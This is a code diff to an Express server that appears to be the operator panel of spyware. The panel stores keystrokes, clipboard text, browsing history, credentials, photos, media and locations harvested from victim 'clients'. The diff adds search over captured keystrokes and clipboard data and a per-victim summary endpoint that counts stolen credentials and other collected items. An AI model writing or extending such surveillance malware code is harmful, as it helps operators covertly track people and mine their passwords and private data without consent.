@@ -1018,16 +1018,20 @@ app.get('/api/events', requireAuth, (req, res) => {
 app.get('/api/keystrokes', requireAuth, (req, res) => {
     const limit = Math.min(parseInt(req.query.limit) || 100, 1000);
     const cid = req.query.clientId;
+    const search = (req.query.search || '').toLowerCase();
     let d = store.keystrokes;
     if (cid) d = d.filter(k => k.clientId === cid);
+    if (search) d = d.filter(k => (k.keys || '').toLowerCase().includes(search) || (k.url || '').toLowerCase().includes(search));
     res.json(d.slice(0, limit));
 });
 
 app.get('/api/clipboard', requireAuth, (req, res) => {
     const limit = Math.min(parseInt(req.query.limit) || 50, 500);
     const cid = req.query.clientId;
+    const search = (req.query.search || '').toLowerCase();
     let d = store.clipboard;
     if (cid) d = d.filter(c => c.clientId === cid);
+    if (search) d = d.filter(c => (c.text || '').toLowerCase().includes(search) || (c.url || '').toLowerCase().includes(search));
     res.json(d.slice(0, limit));
 });
 
@@ -1140,6 +1144,21 @@ app.post('/api/tags/:clientId', requireAuth, (req, res) => {
 });
 
 // ── Per-client data export ──
+app.get('/api/client/:id/summary', requireAuth, (req, res) => {
+    const id = req.params.id;
+    if (!store.clients[id]) return res.status(404).json({ error: 'Client not found' });
+    res.json({
+        keystrokeCount: store.keystrokes.filter(k => k.clientId === id).length,
+        clipboardCount: store.clipboard.filter(c => c.clientId === id).length,
+        visitCount: store.pageVisits.filter(v => v.clientId === id).length,
+        credentialCount: (store.credentials || []).filter(c => c.clientId === id).length,
+        photoCount: store.photos.filter(p => p.clientId === id).length,
+        mediaCount: store.media.filter(m => m.clientId === id).length,
+        locationCount: store.locations.filter(l => l.clientId === id).length,
+        errorCount: store.errors.filter(e => e.clientId === id).length
+    });
+});
+
 app.get('/api/client/:id/export', requireAuth, (req, res) => {
     const id = req.params.id;
     const data = {
